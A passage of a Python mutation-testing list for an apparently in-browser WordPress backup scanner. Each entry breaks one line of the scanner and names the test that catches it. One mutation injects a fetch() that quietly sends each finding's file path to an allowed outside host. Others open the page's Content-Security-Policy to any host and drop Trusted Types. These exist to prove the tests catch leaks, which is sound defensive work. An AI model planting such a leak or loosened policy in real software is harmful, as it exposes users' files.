        "(unpackedName.has(problem.path) ? { ...problem, path: unpackedName.get(problem.path) } : problem)", "problem",
        (sample("photo_written_twice_with_a_dot_segment"),),
    ),
    Mutation(
        "a name two entries share shown as one of their written names", ENGINE,
        "const isShown = !shared.has(entry.name) && entry.writtenName;", "const isShown = entry.writtenName;",
        (sample("mu_plugin_written_twice_through_a_dot_segment"),),
    ),
    Mutation(
        "an entry shown under the name it is checked by", ENGINE,
        "const writtenEntry = (path) => writtenOf.get(path) ?? withoutHidden(path);", "const writtenEntry = (path) => withoutHidden(path);",
        (sample("always_loaded_code_written_with_dot_segments"),),
    ),
    Mutation(
        "the outer archive of a nested finding shown as checked", ENGINE,
        "    if (outer !== null) return writtenEntry(outer) + path.slice(outer.length);\n", "",
        ("test_report_details.py::test_names_with_dot_segments_are_reported_as_written",),
    ),
    Mutation(
        "the top of a part shown as no place", ENGINE,
        "return path === hidden ? TOP_OF_ARCHIVE : path.slice(hidden.length);", "return path.slice(hidden.length);",
        (sample("updraftplus_others_part"),),
    ),
    Mutation(
        "a drop-in at the top marks no part", ENGINE,
        "const marks = written.length === 1 ? DROP_INS.has(written[0]) :", "const marks = written.length === 1 ? false :",
        (sample("updraftplus_others_part_with_a_drop_in_alone"),),
    ),
    *(
        Mutation(
            f"a {folder} folder at the top marks no part", ENGINE,
            "new Set(['plugins', 'themes', 'uploads', 'mu-plugins', 'languages'])",
            "new Set(" + repr([mark for mark in ("plugins", "themes", "uploads", "mu-plugins", "languages") if mark != folder]) + ")",
            (sample(guard),),
        )
        for folder, guard in {
            "plugins": "updraftplus_plugins_part", "themes": "updraftplus_themes_part", "uploads": "updraftplus_uploads_part",
            "mu-plugins": "updraftplus_others_part_with_mu_plugins_alone", "languages": "updraftplus_others_part_with_languages_alone",
        }.items()
    ),
    Mutation(
        "a part's marks read in any letter case", ENGINE,
        "    const written = entry.name.split('/');\n", "    const written = parts;\n",
        (sample("plugins_folder_in_capitals"),),
    ),
    Mutation(
        "a part may take any file off the list of code WordPress loads by itself", ENGINE,
        "  return takesOffTheList ? null : part;", "  return part;",
        (sample("site_kept_in_a_folder_named_plugins"), sample("config_written_in_a_dot_folder_beside_plugins")),
    ),
    Mutation(
        "a part may take nothing in a plugin's folder off that list", ENGINE,
        "    isCodeFile(entry) && !liesInAPackage(entry.name)\n", "    isCodeFile(entry)\n",
        (sample("updraftplus_plugins_part_with_a_plugin_shipping_wp_content"),),
    ),
    Mutation(
        "a part may take a site's files lying in a theme's folder off that list", ENGINE,
        "  return parts.length > 3 || !(isSiteConfig(name) || isMaintenanceFile(name));", "  return true;",
        (sample("site_kept_in_a_theme_folder"),),
    ),
    Mutation(
        "a part may take files of a plugin named wp-content off that list", ENGINE,
        "['', CONTENT_FOLDER].includes(parts[1].toLowerCase())", "parts[1] === ''",
        (sample("copy_of_wp_content_kept_as_a_mu_plugin_named_wp_content"),),
    ),
    Mutation(
        "with a wp-config.php and no core, the plugins looked for under the copy's first spelling", ENGINE,
        "siteCopy: configEntry ? null : siteCopy })", "siteCopy })",
        (sample("copy_without_core_after_a_folder_in_capitals"),),
    ),
    Mutation(
        "any wp-content, however named, taken for a WordPress that was compared", ENGINE,
        "entries.some((entry) => entry.name.startsWith(`${contentRoot}wp-content/`))", "contentFolders.size > 0",
        (sample("site_named_with_backslashes_and_a_wp_content"),),
    ),
    Mutation(
        "a plugin's own wp-content refuses a part", ENGINE,
        "new Set(['plugins', 'themes', 'mu-plugins']);", "new Set([]);",
        (sample("updraftplus_plugins_part_with_a_plugin_shipping_wp_content"),),
    ),
    Mutation(
        "a climbing name hidden by a part", ENGINE,
        "if (isPathTraversal(logical) || endsWithPathPart(lower, VERSION_FILE)) return false;", "if (endsWithPathPart(lower, VERSION_FILE)) return false;",
        (sample("plugins_folder_beside_a_climbing_name"),),
    ),
    Mutation(
        "a core allowed in a part", ENGINE,
        "if (isPathTraversal(logical) || endsWithPathPart(lower, VERSION_FILE)) return false;", "if (isPathTraversal(logical)) return false;",
        (sample("plugins_folder_beside_a_core"),),
    ),
    Mutation(
        "every file under __MACOSX taken for a Finder twin", ENGINE,
        "&& (fileName === '' || fileName.startsWith(MAC_TWIN_PREFIX));", ";",
        (sample("wordpress_kept_under_macosx"),),
    ),
    Mutation(
        "the folder entries under __MACOSX taken for part of the site", ENGINE,
        "(fileName === '' || fileName.startsWith(MAC_TWIN_PREFIX))", "fileName.startsWith(MAC_TWIN_PREFIX)",
        (sample("site_zipped_by_macos_finder"),),
    ),
    Mutation(
        "the Finder twins under __MACOSX taken for part of the site", ENGINE,
        "(fileName === '' || fileName.startsWith(MAC_TWIN_PREFIX))", "fileName === ''",
        (sample("site_zipped_by_macos_finder"),),
    ),
    Mutation(
        "the bundled themes of a core kept in wp/ looked for under the core", CHECKSUMS,
        "const name = (isCoreCode ? site.root : site.contentRoot) + relative;", "const name = site.root + relative;",
        (sample("bundled_theme_beside_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "the site's plugins looked for beside a core kept apart from them", ENGINE,
        "const folder = siteCopy ?? keptApart.get(root.replaceAll('\\\\', '/').toLowerCase());", "const folder = siteCopy ?? undefined;",
        (sample("plugin_of_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "the plugin files of a core kept apart compared from the core's folder", CHECKSUMS,
        "const folder = `${site.contentRoot}wp-content/plugins/${plugin.slug}/`;", "const folder = `${site.root}wp-content/plugins/${plugin.slug}/`;",
        (sample("plugin_of_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "the plugin identities of a core kept apart read from the core's folder", ENGINE,
        "  const base = `${site.contentRoot}wp-content/plugins/`;", "  const base = `${site.root}wp-content/plugins/`;",
        (sample("plugin_of_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "a plugin without a version beside a core kept apart named in the core's folder", ENGINE,
        "reporter.report('component.not_compared', `${site.contentRoot}wp-content/plugins/${plugin.slug}/`,",
        "reporter.report('component.not_compared', `${site.root}wp-content/plugins/${plugin.slug}/`,",
        (sample("plugin_of_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "the themes of a core kept apart looked for in the core's folder", ENGINE,
        "themes: folderNames(entries, `${contentRoot}wp-content/themes/`)", "themes: folderNames(entries, `${root}wp-content/themes/`)",
        ("test_advisories.py::test_a_theme_beside_a_core_kept_in_its_own_folder_is_looked_up",),
    ),
    Mutation(
        "the theme versions of a core kept apart read from the core's folder", ENGINE,
        "  const base = `${site.contentRoot}wp-content/themes/`;", "  const base = `${site.root}wp-content/themes/`;",
        ("test_advisories.py::test_a_theme_beside_a_core_kept_in_its_own_folder_is_looked_up",),
    ),
    Mutation(
        "the findings on plugins of a core kept apart not held back for the comparison", ENGINE,
        "const base = path.startsWith(root) ? root : contentRoot;", "const base = root;",
        (sample("plugin_of_a_core_kept_in_its_own_folder_as_published"),),
    ),
    Mutation(
        "the core's languages folder left off the list", ENGINE,
        "if (contentAt < 0) return isInCoreLanguages(parts, { languageFolders, keptApart });", "if (contentAt < 0) return false;",
        (sample("core_languages_file_runs_program"),),
    ),
    Mutation(
        "the core's languages folder kept on the list beside wp-content/languages", ENGINE,
        "  if (languageFolders.has(keptApart.get(coreFolder) ?? coreFolder)) return false;\n", "",
        (sample("core_languages_file_beside_content_languages"), sample("core_languages_file_beside_empty_content_languages")),
    ),
    Mutation(
        "the languages of a core kept in wp/ looked for beside the core only", ENGINE,
        "languageFolders.has(keptApart.get(coreFolder) ?? coreFolder)", "languageFolders.has(coreFolder)",
        (sample("core_languages_of_a_core_kept_in_its_own_folder"),),
    ),
    Mutation(
        "the core's folder compared in its own letter case for its languages", ENGINE,
        "const coreFolder = parts.slice(0, includesAt).map((part) => `${part.toLowerCase()}/`).join('');",
        "const coreFolder = parts.slice(0, includesAt).map((part) => `${part}/`).join('');",
        (sample("site_folders_named_in_capitals"),),
    ),
    Mutation(
        "a wp-content/Languages folder taken for the languages folder", ENGINE,
        "const isLanguages = parts[contentAt] === CONTENT_FOLDER && parts[contentAt + 1] === LANGUAGES_FOLDER_NAME;",
        "const isLanguages = parts[contentAt + 1]?.toLowerCase() === LANGUAGES_FOLDER_NAME;",
        (sample("names_linux_does_not_read"),),
    ),
    Mutation(
        "a file named languages taken for the languages folder", ENGINE,
        "if (isLanguages && parts.length > contentAt + 2) languageFolders.add(folder);", "if (isLanguages) languageFolders.add(folder);",
        (sample("core_languages_file_beside_a_file_named_languages"),),
    ),
    Mutation(
        "a copy named by its lower-case key, not as written", ENGINE,
        "if (!contentFolders.has(folder)) contentFolders.set(folder, logical.slice(0, folder.length));",
        "if (!contentFolders.has(folder)) contentFolders.set(folder, folder);",
        (sample("site_folders_named_in_capitals"),),
    ),
    Mutation(
        "a wp-config.php above the site left off the list", ENGINE,
        "!fileNames.has(`${above}${SETTINGS_FILE}`)) folders.add(above);", "!fileNames.has(`${above}${SETTINGS_FILE}`)) folders.add(folder);",
        (sample("config_above_the_core_runs_program"),),
    ),
    Mutation(
        "a wp-config.php above read while the site has its own", ENGINE,
        "if (!fileNames.has(`${folder}${CONFIG_FILE}`) && !fileNames", "if (!fileNames",
        (sample("site_config_runs_program"),),
    ),
    Mutation(
        "a wp-config.php above read beside a wp-settings.php", ENGINE,
        " && !fileNames.has(`${above}${SETTINGS_FILE}`)) folders.add(above);", ") folders.add(above);",
        (sample("config_above_a_folder_with_wp_settings"),),
    ),
    Mutation(
        "a WP-Config.php or WP-Settings.PHP taken off the list as if Linux read it", ENGINE,
        "return logical.slice(0, nameAt).toLowerCase() + logical.slice(nameAt);", "return logical.toLowerCase();",
        (sample("names_linux_does_not_read"),),
    ),
    Mutation(
        "the archive's folder names compared in their own letter case", ENGINE,
        "return logical.slice(0, nameAt).toLowerCase() + logical.slice(nameAt);", "return logical;",
        (sample("site_folders_named_in_capitals"),),
    ),
    Mutation(
        "the archive's names compared with their backslashes", ENGINE,
        "const fileNamesOf = (entries) => new Set(entries.map((entry) => {\n  const logical = entry.name.replaceAll('\\\\', '/');",
        "const fileNamesOf = (entries) => new Set(entries.map((entry) => {\n  const logical = entry.name;",
        (sample("backslash_site_with_a_config_above"),),
    ),
    Mutation(
        "a copy at the top of the archive named with no folder", ENGINE,
        "contentFolders.get(folder) || TOP_OF_ARCHIVE", "contentFolders.get(folder)",
        (sample("copy_at_the_top_beside_a_second_install"),),
    ),
    Mutation(
        "copies without their core not named", ENGINE,
        "  for (const otherCopy of site.otherCopies) reporter.report('scan.other_copy', otherCopy, {});\n", "",
        (sample("plugin_of_a_copy_without_core"),),
    ),
    Mutation(
        "a core named with backslashes not taken for a site", ENGINE,
        "const logical = entry.name.replaceAll('\\\\', '/').toLowerCase();\n    if (endsWithPathPart(logical, VERSION_FILE))",
        "const logical = entry.name.toLowerCase();\n    if (endsWithPathPart(logical, VERSION_FILE))",
        (sample("site_named_with_backslashes"),),
    ),
    Mutation(
        "loose PHP judged against the copy's root, not its own site folder", ENGINE,
        "  const siteFolder = siteFolderOf(site, path);\n", "  const siteFolder = site.root;\n",
        (sample("second_wordpress_listed_first"),),
    ),
    Mutation(
        "the place of loose PHP named from the copy's root, not its own site folder", ENGINE,
        "const siteFolder = root === null ? null : siteFolderOf(site, entry.name);", "const siteFolder = root;",
        ("test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",),
    ),
    Mutation(
        "the files of the languages folder left off the list", ENGINE,
        "  if (inside[0].toLowerCase() === LANGUAGES_FOLDER_NAME) return isLanguageFile(inside.slice(1));\n", "",
        (sample("locale_file_runs_program"), sample("translation_file_runs_program")),
    ),
    Mutation(
        "an empty wp-content/languages folder not counted", ENGINE,
        "parts.length > contentAt + 2) languageFolders.add(folder);", "parts.length > contentAt + 2 && parts.at(-1) !== '') languageFolders.add(folder);",
        (sample("core_languages_file_beside_empty_content_languages"),),
    ),
    Mutation(
        "a languages file of any extension taken for the locale file", ENGINE,
        "if (inside.length === 1) return name.endsWith(LOCALE_FILE_ENDING);", "if (inside.length === 1) return true;",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    Mutation(
        "any PHP in languages/plugins taken for a translation file", ENGINE,
        "TRANSLATION_SUBFOLDERS.has(inside[0].toLowerCase()) && name.endsWith(TRANSLATION_ENDING);",
        "TRANSLATION_SUBFOLDERS.has(inside[0].toLowerCase());",
        (sample("php_in_languages_that_is_not_a_translation"),),
    ),
    Mutation(
        "a translation file in any languages subfolder put on the list", ENGINE,
        "TRANSLATION_SUBFOLDERS.has(inside[0].toLowerCase()) && name.endsWith(TRANSLATION_ENDING);", "name.endsWith(TRANSLATION_ENDING);",
        (sample("translations_that_are_data"),),
    ),
    Mutation(
        "a translation file deeper in languages put on the list", ENGINE,
        "return inside.length === 2 && TRANSLATION_SUBFOLDERS", "return TRANSLATION_SUBFOLDERS",
        (sample("translations_that_are_data"),),
    ),
    Mutation(
        "plain translation files put on the list", ENGINE,
        "    return holdsOnlyLiterals(code, ", "    return false && holdsOnlyLiterals(code, ",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    Mutation(
        "a translation file holding code taken for data", ENGINE,
        "    return holdsOnlyLiterals(code, ", "    return true || holdsOnlyLiterals(code, ",
        (sample("translation_file_runs_program"),),
    ),
    Mutation(
        "any listed file of literals taken for data, not only a translation file", ENGINE,
        "if (code === null || !isTranslationName(path)) return false;", "if (code === null) return false;",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    Mutation(
        "a translation file printing text before its PHP taken for data", PHP_RULES,
        "STARTS_AS_CODE.test(source) && tokenizePhp", "tokenizePhp",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    Mutation(
        "a translation file printing text after a closing tag taken for data", PHP_RULES,
        "isLiteralToken(token) && !closesTag(source, token)", "isLiteralToken(token)",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    Mutation(
        "PHP lying beside a copy of wp-content without its core not named", ENGINE,
        "if (parts.length === 1) return namesFilesLyingInIt(site, siteFolder) ? siteFolder || TOP_OF_ARCHIVE : null;", "if (parts.length === 1) return null;",
        (sample("config_and_maintenance_in_a_site_folder"), sample("maintenance_beside_core_only")),
    ),
    Mutation(
        "PHP lying beside a copy at the top of the archive named without a folder", ENGINE,
        "namesFilesLyingInIt(site, siteFolder) ? siteFolder || TOP_OF_ARCHIVE : null", "namesFilesLyingInIt(site, siteFolder) ? siteFolder : null",
        (sample("php_beside_a_copy_without_core_at_the_top"),),
    ),
    Mutation(
        "PHP beside a copy at the top of the archive said to lie where WordPress loads no code", ENGINE,
        "  if (siteLower === '' && folder === TOP_OF_ARCHIVE) return 'site';\n", "",
        ("test_page_report.py::test_loose_php_beside_a_copy_at_the_top_of_the_archive_is_named_by_its_place",),
    ),
    Mutation(
        "the core's own files of a second WordPress named loose", ENGINE,
        "return contentFolders.has(lower) && !coreFolders.has(lower);", "return contentFolders.has(lower);",
        (sample("mu_plugin_of_second_wordpress"),),
    ),
    Mutation(
        "PHP lying directly in any folder without a core named, wp-content or not", ENGINE,
        "return contentFolders.has(lower) && !coreFolders.has(lower);", "return !coreFolders.has(lower);",
        (sample("php_in_an_archive_without_wordpress"),),
    ),
    Mutation(
        "PHP beside a copy without its core said to lie where WordPress loads no code", ENGINE,
        "[LANGUAGES_FOLDER, 'languages'], ['', 'site']]", "[LANGUAGES_FOLDER, 'languages'], ['', 'folder']]",
        ("test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",),
    ),
    Mutation(
        "a string reading a variable taken for a literal", PHP_RULES,
        "if (token.kind === 'string') return !token.interpolated;", "if (token.kind === 'string') return true;",
        ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
    ),
    *(
        Mutation(
            f"a translation file using {literal} taken for code", PHP_RULES,
            f"new Set([{members}])", f"new Set([{', '.join(other for other in members.split(', ') if other != literal)}])",
            ("test_page_report.py::test_the_always_loaded_list_holds_language_files_that_are_more_than_texts",),
        )
        for members in ("'return', 'null'", "'[', ']', '=>', ',', '.', ';'")
        for literal in members.split(", ")
    ),
    Mutation(
        "a wp-config.php in any folder put on the list", ENGINE,
        "return configFolders.has(folderOf(path));", "return true;",
        (sample("config_and_maintenance_where_wordpress_does_not_read_them"),),
    ),
    Mutation(
        "a folder holding a wp-content not taken for a site", ENGINE,
        "    if (!contentFolders.has(folder)) contentFolders.set(folder, logical.slice(0, folder.length));\n", "",
        (sample("config_and_maintenance_in_a_site_folder"),),
    ),
    Mutation(
        "PHP in languages that is no translation taken for a translation", ENGINE,
        "  if (lower.startsWith(LANGUAGES_FOLDER) && !lower.endsWith(TRANSLATION_ENDING)) return `${siteFolder}${parts.slice(0, 2).join('/')}/`;\n", "",
        (sample("php_in_languages_that_is_not_a_translation"),),
    ),
    Mutation(
        "every PHP file in languages called loose", ENGINE,
        "lower.startsWith(LANGUAGES_FOLDER) && !lower.endsWith(TRANSLATION_ENDING)", "lower.startsWith(LANGUAGES_FOLDER)",
        (sample("php_outside_code_folders"),),
    ),
    Mutation(
        "loose PHP in languages said to lie where WordPress loads no code", ENGINE,
        "[LANGUAGES_FOLDER, 'languages']", "[LANGUAGES_FOLDER, 'folder']",
        ("test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",),
    ),
    Mutation(
        "loose PHP straight in wp-content said to lie where WordPress loads no code", ENGINE,
        "['wp-content/', 'content']", "['wp-content/', 'folder']",
        ("test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",),
    ),
    Mutation(
        "loose PHP in a cache folder said to lie straight in wp-content", ENGINE,
        "return LOOSE_PLACES.get(lower.slice(siteLower.length)) ?? LOOSE_IN_FOLDER;", "return 'content';",
        ("test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",),
    ),
    Mutation(
        "the English sentence of loose PHP deaf to where it lies", "scanner/messages-en.js",
        "const [one, many] = LOOSE_PLACE_TEXT.get(params.get('place')) ?? LOOSE_FOLDER_TEXT;", "const [one, many] = LOOSE_FOLDER_TEXT;",
        ("test_messages.py::test_words_follow_their_count",),
    ),
    Mutation(
        "the Polish sentence of loose PHP deaf to where it lies", "scanner/messages-pl.js",
        "const where = LOOSE_PLACE_TEXT.get(params.get('place')) ?? LOOSE_FOLDER_TEXT;", "const where = LOOSE_FOLDER_TEXT;",
        ("test_messages.py::test_words_follow_their_count",),
    ),
    Mutation(
        "a red reason labelled again under a red row", "harness.css",
        '.finding[data-severity="red"] .finding-reason[data-severity="red"] .reason-weight,',
        '.finding[data-severity="none"] .finding-reason[data-severity="red"] .reason-weight,',
        ("test_page_behaviour.py::test_only_the_lighter_reasons_of_a_row_carry_their_own_weight",),
    ),
    Mutation(
        "an amber reason labelled again under an amber row", "harness.css",
        '.finding[data-severity="amber"] .finding-reason[data-severity="amber"] .reason-weight {',
        '.finding[data-severity="none"] .finding-reason[data-severity="amber"] .reason-weight {',
        ("test_page_behaviour.py::test_an_amber_row_labels_only_its_unchecked_reason",),
    ),
    Mutation(
        "the whole copy labelled in English on the Polish page", "scanner/messages-pl.js",
        "wholeCopy: '(cała kopia)'", "wholeCopy: '(the whole copy)'",
        ("test_page_report.py::test_the_polish_page_labels_the_whole_copy_in_polish",),
    ),
    Mutation(
        "findings in one file counted as files to read", MAIN,
        "filesHolding(ruleOnly)", "ruleOnlyRed",
        ("test_page_report.py::test_the_example_is_built_in_the_browser_and_scanned_like_any_file",),
    ),
    Mutation(
        "one always-loaded file headed as many in the report", "scanner/messages-en.js",
        "loadedCode: (total) => (total === 1 ? 'CODE", "loadedCode: (total) => (total === 0 ? 'CODE",
        ("test_page_report.py::test_one_file_that_always_runs_is_named_in_the_singular",),
    ),
    Mutation(
        "two snippet plugins named as one", "scanner/messages-en.js",
        "return plugins.includes(', ')", "return false",
        ("test_messages.py::test_two_active_snippet_plugins_are_named_in_the_plural",),
    ),
    Mutation(
        "rows of files called findings under the list", "scanner/messages-en.js",
        "`The list shows the ${withNoun(shown, 'file', 'files')} with the heaviest findings. `",
        "`The list shows ${formatCount(shown)} findings, the heaviest first. `",
        ("test_page_behaviour.py::test_a_red_finding_past_the_drawn_rows_is_still_drawn",),
    ),

    Mutation(
        # The leak a tampered build would use: an allowed host, so the page policy lets it pass.
        "page sends each finding's path out", "scanner/main.js",
        "    report.findings.push(finding);\n",
        "    report.findings.push(finding);\n"
        "    fetch(`https://api.wordpress.org/plugins/info/1.2/?q=${encodeURIComponent(finding.path)}`).catch(() => {});\n",
        ("test_file_never_leaves.py::test_nothing_from_the_file_leaves_the_browser",),
    ),
    Mutation(
        "page may connect anywhere", "_headers",
        "connect-src https://api.wordpress.org https://downloads.wordpress.org https://www.wpvulnerability.net;", "connect-src *;",
        ("test_page_security.py::test_page_cannot_send_data_to_a_foreign_host",),
    ),
    Mutation(
        "page may load images from anywhere", "_headers", "img-src 'self';", "img-src *;",
        ("test_page_security.py::test_page_cannot_leak_through_an_image_address",),
    ),
    Mutation(
        "Trusted Types not enforced", "_headers",
        "; require-trusted-types-for 'script'; trusted-types wp-backup-scanner", "",
        ("test_page_security.py::test_browser_refuses_text_inserted_as_markup",),
    ),
    Mutation(
        "worker may connect anywhere", "_headers", "connect-src 'none'", "connect-src *",
        ("test_page_security.py::test_worker_has_no_network_at_all",),
    ),

    # The line a finding points at, and the hash of a red file.
    Mutation(
        "code findings without their line", PHP_RULES, ", excerpt: excerptAround(source, at) }", " }",
        ("test_report_details.py::test_a_code_finding_shows_its_line",),
    ),
    Mutation(
        "excerpt taken from the start of the line", "scanner/excerpt.js", "Math.max(lineStart, at - BEFORE_CHARACTERS)", "lineStart",
        ("test_report_details.py::test_a_long_line_is_shown_as_a_window_around_the_place",),
    ),
    Mutation(
        "excerpt bytes not read back as UTF-8", "scanner/excerpt.js",
        "BYTE_OF_CHARACTER.get(character) ?? character.charCodeAt(0)", "character.charCodeAt(0)",
        ("test_report_details.py::test_an_excerpt_keeps_letters_outside_ascii",),
    ),
    Mutation(
        "settings findings without their line", ENGINE, "{ ...params, excerpt: excerptOfLine(settings, params.line) }", "params",
        ("test_report_details.py::test_a_settings_finding_shows_its_line",),
    ),
    Mutation(
        "red files not hashed", ENGINE, "        if (severity === 'red') red.set(path, red.has(path) && red.get(path) !== file ? null : file);\n", "",
        ("test_report_details.py::test_red_files_are_hashed",),
    ),
    Mutation(
        "a file named twice hashed anyway", ENGINE,
        "if (file === null || !entries.has(file) || ambiguous.has(file)) continue;", "if (file === null || !entries.has(file)) continue;",
        ("test_report_details.py::test_two_files_under_one_name_are_not_hashed",),
    ),
    Mutation(
        "two files under one red path, the last one hashed", ENGINE,
        "red.set(path, red.has(path) && red.get(path) !== file ? null : file);", "red.set(path, file);",
        ("test_report_details.py::test_a_red_path_two_files_share_shows_no_hash",),
    ),
    Mutation(
        "a repeated red finding of another file not seen", ENGINE,
        "        if (severity === 'red') red.set(path, red.has(path) && red.get(path) !== file ? null : file);\n"
        "        const key = `${rule}\\u{0}${path}`;\n"
        "        if (named.has(key)) return;\n"
        "        named.add(key);\n",
        "        const key = `${rule}\\u{0}${path}`;\n"
        "        if (named.has(key)) return;\n"
        "        named.add(key);\n"
        "        if (severity === 'red') red.set(path, red.has(path) && red.get(path) !== file ? null : file);\n",
        ("test_report_details.py::test_a_red_path_two_files_share_shows_no_hash",),
    ),
    Mutation(
        "no hash for the archive around a red file", ENGINE, "${writtenOf.get(path) ?? path}`, params, { file: outerName })", "${writtenOf.get(path) ?? path}`, params)",
        ("test_report_details.py::test_a_red_file_inside_an_archive_gives_the_hash_of_that_archive",),
    ),
    Mutation(
        "a decoy named like a finding inside an archive takes its hash", ENGINE,
        "for (const [path, file] of redFiles) {",
        "for (const [path, reported] of redFiles) {\n    const file = entries.has(path) ? path : reported;",
        ("test_report_details.py::test_a_decoy_named_like_a_finding_inside_an_archive_does_not_take_its_hash",),
    ),
    Mutation(
        "the hashed file guessed back from the path", ENGINE,
        "for (const [path, file] of redFiles) {",
        "for (const [path, reported] of redFiles) {\n    const file = outerEntryOf(path, (candidate) => entries.has(candidate)) ?? reported;",
        ("test_report_details.py::test_a_red_file_named_like_a_finding_inside_an_archive_keeps_its_own_hash",),
    ),
    Mutation(
        "rows joined with hashes by file, not by finding", "scanner/report-export.js",
        "file.findings.map((path) => [path, file.sha256])", "[[file.path, file.sha256]]",
        (
            "test_report_details.py::test_a_finding_inside_an_archive_shows_the_archive_hash_beside_a_red_entry_it_starts_with",
            "test_report_details.py::test_an_archive_named_with_the_separator_is_hashed_and_named_as_written",
        ),
    ),
    Mutation(
        "a hash's findings named as checked", ENGINE, "findings: file.findings.map(written)", "findings: file.findings",
        ("test_report_details.py::test_names_with_dot_segments_are_reported_as_written",),
    ),
    Mutation(
        "a finding named like an entry shown through another entry", ENGINE,
        "    if (entryNames.has(path)) return writtenEntry(path);\n", "",
        ("test_report_details.py::test_a_red_file_named_like_an_entry_is_shown_as_written",),
    ),
    # A file comes off the list only for a blocker every unpacker writes where the scanner reads it.
    Mutation(
        "every entry a blocker", ENGINE,
        "return entries.filter((entry) => isWrittenAlike(entry, writesSlashes));", "return entries;",
        tuple(f"test_samples.py::test_sample_findings[config_above_beside_a_decoy_{label}]" for label in (
            "with_a_trailing_dot", "written_with_backslashes", "settings_with_a_trailing_dot",
        )),
    ),
    Mutation(
        "a blocker with a trailing dot or space", ENGINE, "  return unpackedNameOf(written) === flattened;\n", "  return true;\n",
        (
            "test_samples.py::test_sample_findings[config_above_beside_a_decoy_with_a_trailing_dot]",
            "test_samples.py::test_sample_findings[config_above_beside_a_decoy_with_a_trailing_space]",
            "test_samples.py::test_sample_findings[config_above_beside_a_decoy_in_a_folder_with_a_trailing_dot]",
            "test_samples.py::test_sample_findings[core_languages_file_beside_a_decoy_languages_folder]",
        ),
    ),
    Mutation(
        "a blocker with \"\\\" in a zip of \"/\" names", ENGINE, "  if (writesSlashes && written.includes('\\\\')) return false;\n", "",
        ("test_samples.py::test_sample_findings[config_above_beside_a_decoy_written_with_backslashes]",),
    ),
    Mutation(
        "no blocker with \"\\\" in a zip written on Windows", ENGINE, "if (writesSlashes && written.includes('\\\\'))", "if (written.includes('\\\\'))",
        ("test_samples.py::test_sample_findings[backslash_site_with_a_config_above]",),
    ),
    Mutation(
        "the languages folder taken from every entry", ENGINE,
        "const { languageFolders } = contentFoldersOf(blockers);", "const { languageFolders } = contentFoldersOf(siteEntries);",
        ("test_samples.py::test_sample_findings[core_languages_file_beside_a_decoy_languages_folder]",),
    ),
    Mutation(
        "the config folders taken from every entry", ENGINE, "configFoldersOf(runFolders, fileNamesOf(blockers))", "configFoldersOf(runFolders, fileNamesOf(siteEntries))",
        ("test_samples.py::test_sample_findings[config_above_beside_a_decoy_with_a_trailing_dot]",),
    ),
    Mutation(
        "the shortest entry before the separator taken for the archive", ENGINE,
        "for (let at = path.lastIndexOf(NESTED_SEPARATOR); at > 0; at = path.lastIndexOf(NESTED_SEPARATOR, at - 1)) {",
        "for (let at = path.indexOf(NESTED_SEPARATOR); at > 0; at = path.indexOf(NESTED_SEPARATOR, at + 1)) {",
        ("test_report_details.py::test_an_archive_named_with_the_separator_is_hashed_and_named_as_written",),
    ),
    Mutation(
        "any text taken for a hash", "scanner/protocol.js",
        "typeof file.sha256 !== 'string' || !SHA256_FORMAT.test(file.sha256)", "typeof file.sha256 !== 'string'",
        ("test_report_details.py::test_a_worker_sending_a_bad_hash_ends_the_scan",),
    ),

    # The page for people: what it says under the verdict, what it lets a visitor take
    # away, the example, the second language.
    switch_off("summary silent about reds that rest on rules", MAIN, "ruleOnlyRed > 0", "test_page_report.py::test_red_from_rules_alone_is_told_apart"),
    Mutation(
        "every red counted as resting on a rule", MAIN,
        "finding.severity === 'red' && RULE_ONLY_FAMILIES.some((family) => finding.rule.startsWith(family))", "finding.severity === 'red'",
        ("test_page_report.py::test_the_summary_keeps_quiet_about_rules_when_no_red_comes_from_them",),
    ),
    Mutation(
        "advice on running the copy shown under a red verdict", MAIN, "if (report.counts.red === 0) lines.push(SUMMARY_TEXT.container);",
        "lines.push(SUMMARY_TEXT.container);",
        ("test_page_report.py::test_red_from_rules_alone_is_told_apart",),
    ),
    Mutation(
        "summary written for a scan that did not finish", MAIN, "report.summary = completed ? summaryLines(report) : [];",
        "report.summary = summaryLines(report);",
        ("test_page_report.py::test_a_scan_that_did_not_finish_has_no_summary",),
    ),
    switch_off("wait for the vulnerability lookup not announced", MAIN, "advisoriesPending", "test_page_report.py::test_the_page_says_what_it_waits_for_after_the_file_is_read"),
    Mutation(
        "the line about waiting left in the finished log", MAIN, "    log.endStatus();\n", "",
        ("test_page_report.py::test_the_page_says_what_it_waits_for_after_the_file_is_read",),
    ),
    Mutation(
        "example button does nothing", MAIN, "  view.example.addEventListener('click', () => begin(buildExampleCopy(UI_TEXT.exampleName)));\n", "",
        ("test_page_report.py::test_the_example_needs_no_network",),
    ),
    Mutation(
        "the switch for masking ignored", MAIN, "maskAddresses: view.mask.checked,", "maskAddresses: true,",
        ("test_page_report.py::test_masking_can_be_switched_off",),
    ),
    Mutation(
        "a refused clipboard leaves the visitor with nothing", MAIN, "    view.reportText.hidden = false;\n", "",
        ("test_page_report.py::test_a_refused_clipboard_puts_the_report_into_a_text_box",),
    ),
    Mutation(
        "addresses left in the copied text", "scanner/report-export.js", "return options.maskAddresses ? maskEmails(text) : text;", "return text;",
        ("test_page_report.py::test_addresses_are_masked_in_the_copied_report_and_shown_on_the_page",),
    ),
    Mutation(
        "addresses left in the downloaded report", "scanner/report-export.js",
